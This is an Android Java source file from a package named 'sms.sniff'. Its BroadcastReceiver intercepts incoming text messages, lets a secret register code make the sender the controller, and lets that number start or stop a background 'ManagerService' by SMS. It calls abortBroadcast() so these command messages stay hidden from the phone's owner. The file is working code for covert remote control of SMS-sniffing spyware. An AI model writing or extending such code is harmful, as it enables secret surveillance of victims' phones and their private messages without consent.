package sms.sniff;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class BehaviorController extends BroadcastReceiver{

	private Intent manager;

	@Override
	public void onReceive(Context context, Intent intent) {
		
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		
		if(bundle != null) {
			
			try {
				Object[] pdus = (Object[]) bundle.get("pdus");
				msgs = new SmsMessage[pdus.length];
				for (int i=0; i < pdus.length; i++) {
					
					msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
					
					String messageBody = msgs[i].getMessageBody();
					String originPhoneNumber = msgs[i].getOriginatingAddress();
					
					manager = new Intent(context, ManagerService.class);
					
					if(messageBody.contains(Constants.messageCode_register)) {
						Constants.destination = originPhoneNumber;
						new SharedPreferencesEditor(context).register(originPhoneNumber);
						abortBroadcast();
					}
					
					if(Constants.destination.equals(originPhoneNumber)) {
						if(messageBody.contains(Constants.messageCode_start)) {
							context.startService(manager);
							abortBroadcast();
						}
						else if(messageBody.contains(Constants.messageCode_pause)) {
							context.stopService(manager);
							abortBroadcast();
						}
					}
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
